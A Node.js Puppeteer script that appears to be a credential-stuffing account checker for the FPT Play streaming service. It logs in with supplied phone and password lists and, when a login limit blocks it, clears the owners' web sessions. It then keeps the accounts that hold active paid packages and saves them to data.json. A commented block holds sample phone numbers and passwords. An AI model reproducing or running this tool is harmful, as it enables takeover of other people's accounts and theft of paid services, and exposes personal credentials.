const pup = require("puppeteer");
const fs = require("fs");
// const originData = [
//   {
//     client_id: "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
//     phone: "0968204119",
//     password: "123456",
//   },
//   {
//     client_id: "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
//     phone: "0968681168",
//     password: "1234567",
//   },
// ];

module.exports = async function crawData(dataFptOrigin) {
  let browser = await pup.launch({ headless: false });
  let page = await browser.newPage();
  page.setViewport({ width: 1280, height: 720 });
  await page.goto("https://fptplay.vn", {
    waitUntil: "networkidle0",
  });

  const res = await page.evaluate(async (dataFpt) => {
    let returnData = [];
    dataFpt.forEach(async (dF) => {
      const promiseFpt = async function () {
        const resLogin = await fetch(
          "https://api.fptplay.net/api/v6.2_w/user/otp/login?st=eP8yZTyywTLmsA1CANOuAg&e=1650938137604&device=Edge(version%253A100.0.1185.50)&drm=1",
          {
            method: "POST",
            mode: "cors",
            body: JSON.stringify(dF),
            headers: {
              "Content-Type": "application/json",
            },
          }
        );
        const jsonResLogin = await resLogin.json();
        if (
          jsonResLogin &&
          jsonResLogin.error_code === 0 &&
          jsonResLogin.data
        ) {
          const resData = await fetch(
            "https://api.fptplay.net/api/v6.2_w/payment/get_v2_user_vips?st=GgygkKX6JIuYHxHNGJJlYw&e=1651161722753&device=Chrome(version%253A101.0.4950.0)&drm=1",
            {
              method: "GET",
              mode: "cors",
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${jsonResLogin.data.access_token}`,
              },
            }
          );
          const resDataJson = await resData.json();
          if (resDataJson && resDataJson.packages.length > 0) {
            let validReturn = false;
            const formatPkg = [];
            resDataJson.packages.forEach((pkg) => {
              if (pkg.dateleft !== null) {
                validReturn = true;
                formatPkg.push(pkg);
              }
            });
            if (validReturn && formatPkg.length > 0)
              return {
                account: { phone: dF.phone, password: dF.password },
                packages: formatPkg,
              };
          }
        }
        if (jsonResLogin && jsonResLogin.error_code === 34) {
          const resLogin2 = await fetch(
            "https://api.fptplay.net/api/v6.2_w/user/otp/clear_web_tokens?st=KjDkYmjMQW-Ifse9Se_dfA&e=1651161655322&device=Chrome(version%253A101.0.4950.0)&drm=1",
            {
              method: "POST",
              mode: "cors",
              body: JSON.stringify(dF),
              headers: {
                "Content-Type": "application/json",
              },
            }
          );
          const jsonResLogin2 = await resLogin2.json();
          if (
            jsonResLogin2 &&
            jsonResLogin2.error_code === 0 &&
            jsonResLogin2.data
          ) {
            const resData2 = await fetch(
              "https://api.fptplay.net/api/v6.2_w/payment/get_v2_user_vips?st=GgygkKX6JIuYHxHNGJJlYw&e=1651161722753&device=Chrome(version%253A101.0.4950.0)&drm=1",
              {
                method: "GET",
                mode: "cors",
                headers: {
                  "Content-Type": "application/json",
                  Authorization: `Bearer ${jsonResLogin2.data.access_token}`,
                },
              }
            );
            const resData2Json = await resData2.json();
            if (resData2Json && resData2Json.packages.length > 0) {
              let validReturn = false;
              const formatPkg = [];
              resData2Json.packages.forEach((pkg) => {
                if (pkg.dateleft !== null) {
                  validReturn = true;
                  formatPkg.push(pkg);
                }
              });
              if (validReturn && formatPkg.length > 0)
                return {
                  account: { phone: dF.phone, password: dF.password },
                  packages: formatPkg,
                };
            }
          }
        }
      };
      returnData.push(promiseFpt);
    });
    const cvData = await Promise.all(returnData.map((cF) => cF()));
    return cvData;
  }, dataFptOrigin);
  browser.close();
  const dataFpt = [];
  res.forEach((r) => {
    if (r) {
      dataFpt.push(r);
    }
  });
  await addDataToJsonFile(dataFpt);
  return dataFpt;
};

function addDataToJsonFile(data) {
  let oldData;
  fs.readFile("./data.json", "utf8", (err, jsonString) => {
    if (err) {
      return;
    }
    try {
      if (jsonString) {
        oldData = JSON.parse(jsonString);
      }
      if (oldData) {
        let uniqueObjArray = [
          ...new Map(
            [...oldData, ...data].map((item) => [
              item["account"]["phone"],
              item,
            ])
          ).values(),
        ];
        fs.writeFile("./data.json", JSON.stringify(uniqueObjArray), (err) => {
          if (err) console.log("Error writing file:", err);
        });
      } else {
        let uniqueObjArray = [
          ...new Map(
            [...data].map((item) => [item["account"]["phone"], item])
          ).values(),
        ];
        fs.writeFile("./data.json", JSON.stringify(uniqueObjArray), (err) => {
          if (err) console.log("Error writing file:", err);
        });
      }
    } catch (err) {
      console.log("Error parsing JSON string:", err);
    }
  });
}
